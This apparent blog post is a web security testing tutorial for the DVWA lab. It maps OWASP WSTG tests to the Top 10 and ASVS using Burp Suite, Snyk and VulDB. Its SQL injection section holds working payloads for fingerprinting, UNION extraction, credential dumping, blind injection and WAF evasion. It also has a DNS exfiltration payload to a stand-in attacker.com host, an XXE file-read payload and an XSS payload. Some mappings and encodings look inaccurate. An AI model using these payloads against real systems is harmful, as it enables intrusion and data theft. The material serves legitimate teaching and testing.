---
layout: post
title: "Burp Primer - WSTG ASVS Burp Vuldb Synk"
date: 2025-05-12
author: unattributed
categories: [webappsec]
tags: [webapp, burp, dvwa, owasp, owasp-wstg, owasp-top-10]
---

# Prime - Web Application Security Testing: OWASP WSTG, OWASP Top 10, and OWASP ASVS

*** NOTE *** This document will be rewritten to align with the OWASP Top 10:2021
*** NOTE *** This document will be rewritten to align with the OWASP ASVS Stable Release 4.0.3
*** NOTE *** This document will be rewritten to align with the OWASP WSTG latest Stable Release _(as per publication date)_

Web application security is a multi-faceted discipline, requiring a thorough approach to testing and remediation. The **OWASP Web Security Testing Guide (WSTG)** and the **OWASP Top 10** vulnerabilities provide a solid framework for assessing the security of web applications. In this document, we will map WSTG tests to relevant OWASP Top 10 vulnerabilities and provide practical testing instructions. Additionally, we will explore how to use both open-source and commercial tools like **Burp Suite Professional**, **Snyk**, and **VulDB** for comprehensive testing. Finally, we will map these vulnerabilities to the **OWASP Application Security Verification Standard (ASVS)** to ensure we cover security requirements at all levels.

---

## Setting Up for Web Application Security Testing

Before diving into the testing methodologies, we need a target application to assess. For this demonstration, we will use **Damn Vulnerable Web Application (DVWA)**, a deliberately vulnerable web application that provides a safe environment for security testing.

### Step 1: Install DVWA

1. Clone the DVWA repository:

   ```bash
   git clone https://github.com/digininja/DVWA.git
   ```
2. Navigate to the DVWA folder:

   ```bash
   cd DVWA
   ```
3. Follow the installation instructions in the [DVWA GitHub repository](https://github.com/digininja/DVWA) to set up **Apache**, **MySQL**, and **PHP** on your local machine.

### Step 2: Set the Security Level

Once DVWA is up and running, log in and set the security level. DVWA's security levels range from **low** to **high**, which will affect the complexity of vulnerabilities you'll find.

---

## Overview of OWASP WSTG and Top 10 Vulnerabilities

### OWASP Web Security Testing Guide (WSTG)

The **WSTG** is a comprehensive guide that covers the most important aspects of web application security testing, providing detailed tests for a variety of vulnerabilities.

For the latest version of the OWASP Web Security Testing Guide (WSTG), refer to the [official OWASP WSTG repository](https://github.com/OWASP/wstg).

### OWASP Top 10

The **OWASP Top 10** represents the most critical security risks to web applications. We’ll cover how each vulnerability is tested using the WSTG methodology and map them to relevant **OWASP ASVS** levels.

_Latest Versions of OWASP Top 10 and OWASP ASVS_

To ensure you are working with the most up-to-date resources, refer to the latest versions of the OWASP Top 10 and OWASP ASVS:

- **OWASP Top 10**: The latest version of the OWASP Top 10 can be found on the [official OWASP Top 10 page](https://owasp.org/www-project-top-ten/).
- **OWASP ASVS**: The most recent version of the OWASP Application Security Verification Standard (ASVS) is available on the [official OWASP ASVS page](https://owasp.org/www-project-application-security-verification-standard/).

---

## Mapping WSTG Tests to OWASP Top 10 Vulnerabilities

Below is a mapping of the **OWASP WSTG** tests to the **OWASP Top 10 vulnerabilities**, with instructions for testing each using **Burp Suite Professional**, **Snyk**, and **VulDB**, along with a reference to the **OWASP ASVS** levels.

---

### 1. **OWASP Top 10: Injection (A1)**

Injection flaws, such as **SQL Injection**, allow attackers to send untrusted data into an interpreter. This is one of the most critical vulnerabilities and can be tested through various WSTG tests.

#### WSTG Test: **WSTG-INP-01: Input Validation**

**Testing for SQL Injection with Burp Suite**:

### **Identifying Database Types via SQL Injection (Using Burp Suite)**  

When testing for SQL injection, determining the underlying database is crucial for crafting precise payloads. Below are **Burp Suite-centric techniques** to fingerprint databases during testing.  

---

## **1. Using Error Messages (Passive Fingerprinting)**  
**Burp Steps:**  
1. **Intercept** a vulnerable request (e.g., `GET /user?id=1`).  
2. **Send to Repeater** (`Ctrl+R`).  
3. **Modify parameter** to trigger SQL errors:  

<table>
   <thead>
      <tr>
         <th>Database</th>
         <th>Payload</th>
         <th>Error Characteristics (Check HTTP Response)</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td><strong>MySQL</strong></td>
         <td><code>id=1'</code></td>
         <td>- <code>You have an error in your SQL syntax...</code></td>
      </tr>
      <tr>
         <td><strong>PostgreSQL</strong></td>
         <td><code>id=1'</code></td>
         <td>- <code>PG::SyntaxError: ERROR: unterminated quoted string</code></td>
      </tr>
      <tr>
         <td><strong>Oracle</strong></td>
         <td><code>id=1'</code></td>
         <td>- <code>ORA-01756: quoted string not properly terminated</code></td>
      </tr>
      <tr>
         <td><strong>SQL Server</strong></td>
         <td><code>id=1'</code></td>
         <td>- <code>Unclosed quotation mark after the character string</code></td>
      </tr>
   </tbody>
</table>


**Burp Tip:** Use **"Match and Replace"** (`Proxy > Options`) to highlight errors automatically.  

---

## **2. Using Time-Based Payloads (Active Fingerprinting)**  
**Burp Steps:**  
1. **Send request to Intruder** (`Ctrl+I`).  
2. **Use Sniper mode**, target the vulnerable parameter.  
3. **Test delay-based payloads:**  

<table>
   <thead>
      <tr>
         <th>Database</th>
         <th>Payload</th>
         <th>Expected Delay</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td><strong>MySQL</strong></td>
         <td><code>1' AND SLEEP(5)-- -</code></td>
         <td>~5 seconds</td>
      </tr>
      <tr>
         <td><strong>PostgreSQL</strong></td>
         <td><code>1' AND pg_sleep(5)-- -</code></td>
         <td>~5 seconds</td>
      </tr>
      <tr>
         <td><strong>Oracle</strong></td>
         <td><code>1' AND (SELECT COUNT(*) FROM ALL_USERS WHERE username='a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5))='a'</code></td>
         <td>~5 seconds</td>
      </tr>
      <tr>
         <td><strong>SQL Server</strong></td>
         <td><code>1' WAITFOR DELAY '0:0:5'-- -</code></td>
         <td>~5 seconds</td>
      </tr>
   </tbody>
</table>

**Burp Tip:** Use **"Response Times"** in Intruder to detect delays.  

---

## **3. Using Version Detection Queries**  
**Burp Steps:**  
1. **Craft UNION-based or stacked queries** in Repeater.  
2. **Extract version info:**  


<table>
   <thead>
      <tr>
         <th>Database</th>
         <th>Payload (Repeater)</th>
         <th>Expected Output</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td><strong>MySQL</strong></td>
         <td><code>1' UNION SELECT 1,@@version,3-- -</code></td>
         <td><code>10.5.8-MariaDB</code></td>
      </tr>
      <tr>
         <td><strong>PostgreSQL</strong></td>
         <td><code>1' UNION SELECT 1,version(),3-- -</code></td>
         <td><code>PostgreSQL 14.2...</code></td>
      </tr>
      <tr>
         <td><strong>Oracle</strong></td>
         <td><code>1' UNION SELECT 1,banner,3 FROM v$version-- -</code></td>
         <td><code>Oracle Database 19c...</code></td>
      </tr>
      <tr>
         <td><strong>SQL Server</strong></td>
         <td><code>1' UNION SELECT 1,@@version,3-- -</code></td>
         <td><code>Microsoft SQL Server 2019...</code></td>
      </tr>
   </tbody>
</table>


**Burp Tip:** Use **"Decoder"** to URL-encode payloads before sending.  

---

## **4. Using Database-Specific Functions**  

<table>
   <thead>
      <tr>
         <th>Database</th>
         <th>Test Payload (Repeater)</th>
         <th>Success Condition</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td><strong>MySQL</strong></td>
         <td><code>id=1' AND MID('ABC',1,1)='A'-- -</code></td>
         <td>Returns <code>ABC</code> data</td>
      </tr>
      <tr>
         <td><strong>PostgreSQL</strong></td>
         <td><code>id=1' AND SUBSTRING('ABC',1,1)='A'-- -</code></td>
         <td>Returns <code>ABC</code> data</td>
      </tr>
      <tr>
         <td><strong>Oracle</strong></td>
         <td><code>id=1' AND SUBSTR('ABC',1,1)='A'-- -</code></td>
         <td>Returns <code>ABC</code> data</td>
      </tr>
      <tr>
         <td><strong>SQL Server</strong></td>
         <td><code>id=1' AND SUBSTRING('ABC',1,1)='A'-- -</code></td>
         <td>Returns <code>ABC</code> data</td>
      </tr>
   </tbody>
</table>

**Burp Tip:** Compare responses between valid (`'A'`) and invalid (`'X'`) payloads.  

---

## **5. Using Burp Collaborator for Out-of-Band (OOB) Testing**  
If the app filters errors, use **DNS exfiltration** to leak DB type:  
```sql
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\share\\'))-- -
```
- **MySQL**: `10.5.8-MariaDB.attacker.com` (DNS callback)  
- **Oracle**: `UTL_HTTP` or `UTL_INADDR` for OOB.  

**Burp Steps:**  
1. **Generate Collaborator payload** (`Burp > Burp Collaborator Client`).  
2. **Insert into SQLi payload** (e.g., `@@version` + Collaborator domain).  
3. **Monitor for DNS callbacks**.  

---

### **Key Burp Suite Features for DB Fingerprinting**  
✔ **Repeater**: Test payloads manually.  
✔ **Intruder**: Automate delay/error detection.  
✔ **Collaborator**: Bypass filters via OOB.  
✔ **Logger**: Track all responses for anomalies.  

**Mapped OWASP ASVS Level**: **ASVS 3.1 (Input Validation)**

### **SQL Injection Testing with Burp Suite**  

This section covers **manual and automated techniques** to test for SQL injection vulnerabilities using **Burp Suite Professional/Community**.  

---

## **1. Setup & Configuration**  
**Prerequisites:**  
- Burp Suite installed (Proxy, Repeater, Intruder, Scanner).  
- Target web application (DVWA).  
- Browser configured to use Burp as proxy (`127.0.0.1:8080`).  

**Steps:**  
1. **Start Burp Proxy** (`Proxy > Intercept ON`).  
2. **Browse the target application** (login forms, search fields, URL parameters).  
3. **Capture requests** in Proxy history (`Proxy > HTTP history`).  

---

## **2. Manual Testing (Repeater & Scanner)**  

### **A. Error-Based SQLi Detection**  
**Objective:** Trigger SQL errors to confirm injection.  

**Steps:**  
1. **Intercept a request** (e.g., `GET /product?id=1`).  
2. **Send to Repeater** (`Ctrl+R`).  
3. **Test with malicious inputs:**  

<table>
   <thead>
      <tr>
         <th>Payload</th>
         <th>Expected Behavior (Check Response)</th>
      </tr>
   </thead>
   <tbody>
      <tr>
         <td><code>id=1'</code></td>
         <td>SQL syntax error (MySQL: <code>You have an error...</code>)</td>
      </tr>
      <tr>
         <td><code>id=1"</code></td>
         <td>Error if app uses double quotes</td>
      </tr>
      <tr>
         <td><code>id=1'-- -</code></td>
         <td>If page loads normally, injection likely</td>
      </tr>
      <tr>
         <td><code>id=1' AND 1=1-- -</code></td>
         <td>Page loads normally (TRUE condition)</td>
      </tr>
      <tr>
         <td><code>id=1' AND 1=2-- -</code></td>
         <td>Page breaks (FALSE condition)</td>
      </tr>
   </tbody>
</table>

**Burp Tip:** Use **"Highlight"** in Repeater to spot differences.  

---

### **B. UNION-Based SQLi (Data Extraction)**  
**Objective:** Extract DB records via `UNION SELECT`.  

**Steps:**  
1. **Find the number of columns** (using `ORDER BY`):  
   ```sql
   id=1' ORDER BY 1-- -  
   id=1' ORDER BY 2-- -  
   ...  
   ```
   - When `ORDER BY X` fails, columns = `X-1`.  

2. **Identify vulnerable columns** (using `UNION SELECT`):  
   ```sql
   id=-1' UNION SELECT 1,2,3-- -
   ```
   - Numbers `2,3` in response? Those columns are injectable.  

3. **Extract data (examples):**  
   - **Database name:**  
     ```sql
     id=-1' UNION SELECT 1,database(),3-- -
     ```
   - **Table names:**  
     ```sql
     id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
     ```
   - **Column names:**  
     ```sql
     id=-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
     ```
   - **Dump credentials:**  
     ```sql
     id=-1' UNION SELECT 1,concat(username,':',password),3 FROM users-- -
     ```

---

### **C. Blind SQLi (Boolean & Time-Based)**  
**Objective:** Extract data without visible errors.  

#### **Boolean-Based (Intruder)**  
1. **Capture a request** (e.g., `GET /profile?id=1`).  
2. **Send to Intruder** (`Ctrl+I`).  
3. **Test with payloads:**  
   ```sql
   id=1' AND SUBSTRING(database(),1,1)='a'-- -
   ```
   - If `TRUE`, page loads normally.  
   - Use **Cluster Bomb** attack to brute-force characters.  

#### **Time-Based (Repeater/Intruder)**  
1. **Test delays:**  
   ```sql
   id=1' AND IF(1=1,SLEEP(5),0)-- -
   ```
   - If response takes **5+ seconds**, injection works.  

---

## **3. Automated Testing (Burp Scanner & SQLmap)**  

### **A. Burp Active Scanner**  
1. **Right-click a request** > **Scan**.  
2. **Check results** (`Dashboard > Scan queue`).  
3. **Review SQLi findings** (`Issues` tab).  

### **B. SQLmap + Burp (For Advanced Testing)**  
1. **Save Burp request** (`Right-click > Save item`).  
2. **Run SQLmap:**  
   ```bash
   sqlmap -r request.txt --batch --risk=3 --level=5
   ```
   - Automates UNION, error-based, blind, and OOB SQLi.  

---

## **4. Bypassing Filters (WAF Evasion)**  
If the app blocks `'` or `UNION`, try:  
- **Hex encoding:** `id=1'` → `id=0x2731`  
- **Comment obfuscation:** `-- -` → `#` or `/*!...*/` (MySQL)  
- **Case variation:** `UnIoN SeLeCt`  

**Burp Tip:** Use **"Payload Processing"** in Intruder to auto-encode payloads.  

---

## **5. Reporting & Mitigation**  
**Burp Findings:**  
- **Vulnerable parameters** (URL, headers, body).  
- **Extracted data** (DB name, tables, creds).  

**Remediation:**  
- Use **prepared statements** (`PDO`, `ORM`).  
- Implement **input validation** (allowlist, not blocklist).  
- Deploy **WAF rules** (ModSecurity, Cloudflare).  

### **Key Burp Suite Features for SQL Injection Testing**  
✔ **Repeater**: Test SQL injection payloads manually and observe responses.  
✔ **Intruder**: Automate testing for SQL injection with payload fuzzing and response analysis.  
✔ **Collaborator**: Perform out-of-band (OOB) SQL injection testing to detect blind vulnerabilities.  
✔ **Logger**: Monitor and analyze all HTTP requests and responses for anomalies related to SQL injection.  

**Mapped OWASP ASVS Level**: **ASVS 3.1 (Input Validation)**

---

### 2. **OWASP Top 10: Broken Authentication (A2)**

#### WSTG Test: **WSTG-AUTH-01: Authentication Mechanism**

**Testing for Authentication Bypass**:

1. **Brute force testing**: Use Burp Suite’s **Intruder** tool to perform brute force attacks on login forms by submitting common username and password combinations.
2. **Session fixation testing**: Test if session tokens are vulnerable to fixation or hijacking by modifying session cookies.

**Mapped OWASP ASVS Level**: **ASVS 2.1 (Authentication)**

---

### 3. **OWASP Top 10: Sensitive Data Exposure (A3)**

#### WSTG Test: **WSTG-CRY-01: Data Encryption**

**Testing for Sensitive Data Exposure**:

1. **Intercepting traffic**: Use Burp Suite to intercept traffic between the web application and the browser. If data is transmitted in plaintext, it is vulnerable to interception.
2. **Check for weak encryption**: Verify whether data is stored and transmitted securely, particularly sensitive data like passwords, credit card details, etc.

**Mapped OWASP ASVS Level**: **ASVS 5.1 (Data Protection)**

---

### 4. **OWASP Top 10: XML External Entities (A4)**

#### WSTG Test: **WSTG-INP-02: XML Injection**

**Testing for XML Injection**:

1. **Test XML-based file uploads** or requests using Burp Suite to inject malicious XML payloads such as:

   * `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

**Mapped OWASP ASVS Level**: **ASVS 4.1 (File Upload)**

---

### 5. **OWASP Top 10: Broken Access Control (A5)**

#### WSTG Test: **WSTG-ACC-01: Access Control Testing**

**Testing for Access Control Issues**:

1. **Check for direct object references**: Try accessing user-specific pages by modifying the URL with different user IDs.
2. **Test role-based access control**: Manipulate session tokens and attempt to access unauthorized resources.

**Mapped OWASP ASVS Level**: **ASVS 5.1 (Access Control)**

---

### 6. **OWASP Top 10: Security Misconfiguration (A6)**

#### WSTG Test: **WSTG-CONF-01: Misconfiguration Testing**

**Testing for Security Misconfiguration**:

1. **Check for exposed default credentials**: Use tools like Burp Suite or **Nikto** to test for default passwords and unprotected endpoints.
2. **Review server banners**: Use **Burp Suite** to inspect HTTP headers and check for unnecessary information about server software.

**Mapped OWASP ASVS Level**: **ASVS 1.1 (Configuration)**

---

### 7. **OWASP Top 10: Cross-Site Scripting (A7)**

#### WSTG Test: **WSTG-INP-01: Cross-Site Scripting (XSS)**

**Testing for XSS**:

1. **Reflected XSS**: Use Burp Suite’s **Scanner** to scan for XSS vulnerabilities in web pages that reflect user input, such as search or comment fields.
2. **Stored XSS**: Inject malicious scripts into form inputs, such as `<script>alert('XSS')</script>`, and check if they are executed when the page is loaded.

**Mapped OWASP ASVS Level**: **ASVS 4.1 (Input Validation)**

---

### 8. **OWASP Top 10: Insecure Deserialization (A8)**

#### WSTG Test: **WSTG-APPI-01: Deserialization Testing**

**Testing for Insecure Deserialization**:

1. **Test for deserialization issues**: Modify and replay serialized objects using Burp Suite’s **Repeater** or a tool like **ysoserial** to test if the application can be exploited.
2. **Check for vulnerable libraries**: Look for outdated libraries or insecure deserialization mechanisms in third-party components.

**Mapped OWASP ASVS Level**: **ASVS 6.2 (Data Integrity)**

---

### 9. **OWASP Top 10: Using Components with Known Vulnerabilities (A9)**

#### WSTG Test: **WSTG-CRY-03: Third-Party Libraries**

**Testing for Vulnerabilities in Third-Party Libraries**:

1. **Snyk**: Use **Snyk** to scan your application’s dependencies for known vulnerabilities.

   * Install Snyk:

     ```bash
     npm install -g snyk
     ```
   * Run Snyk test:

     ```bash
     snyk test
     ```
   * Review the findings and take action to update vulnerable libraries.
2. **VulDB**: Use **VulDB** to search for vulnerabilities in libraries or components used by the application.

**Mapped OWASP ASVS Level**: **ASVS 10.1 (Third-Party Components)**

---

### 10. **OWASP Top 10: Insufficient Logging & Monitoring (A10)**

#### WSTG Test: **WSTG-LOG-01: Logging and Monitoring**

**Testing for Insufficient Logging**:

1. **Check for missing logs**: Review the application for missing logging functionality, especially for critical security events like failed logins and privilege escalation.
2. **Test logging levels**: Ensure that logs are properly stored, monitored, and contain sufficient details for auditing and incident response.

**Mapped OWASP ASVS Level**: **ASVS 9.1 (Logging and Monitoring)**

---

## Using Open-Source and Commercial Tools for Web Application Testing

### 1. **Burp Suite Professional**

Burp Suite Professional is one of the most widely used tools for web application security testing. It provides a suite of tools for **manual and automated testing**, including:

* **Proxy**: Intercepts HTTP/HTTPS traffic for modification.
* **Intruder**: Automates brute force and fuzzing attacks.
* **Scanner**: Automates vulnerability scanning (available in the Pro version).
* **Repeater**: Allows manual testing and modification of individual HTTP requests.

### 2. **Snyk**

Snyk is an open-source vulnerability scanning tool that helps developers identify and fix vulnerabilities in third-party libraries and dependencies. It supports various languages like Node.js, Java, Python, and Ruby.

### 3. **VulDB**

VulDB is an online vulnerability database that provides detailed information on known vulnerabilities across multiple software components. It's useful for researching vulnerabilities in third-party libraries or specific software versions.

### 4. **Nikto**

Nikto is an open-source web server scanner that tests for outdated software versions, exposed files, and known vulnerabilities in web servers.

---

## Conclusion

Web application security is an ongoing process that requires a comprehensive approach. By using tools like **Burp Suite Professional**, **Snyk**, and **VulDB**, along with performing detailed WSTG tests and mapping them to the OWASP Top 10 and ASVS levels, security professionals can ensure that their web applications are tested thoroughly for common vulnerabilities and misconfigurations. This document provides a detailed framework for executing the latest OWASP WSTG tests, understanding the OWASP Top 10 vulnerabilities, and leveraging both open-source and commercial tools for effective web application security testing.

---

This guide integrates **OWASP WSTG**, **OWASP Top 10**, and **OWASP ASVS** in a comprehensive manner, helping security professionals conduct thorough tests on web applications using best practices and powerful tools.

[🔝 Back to Top](#prime---web-application-security-testing-owasp-wstg-owasp-top-10-and-owasp-asvs)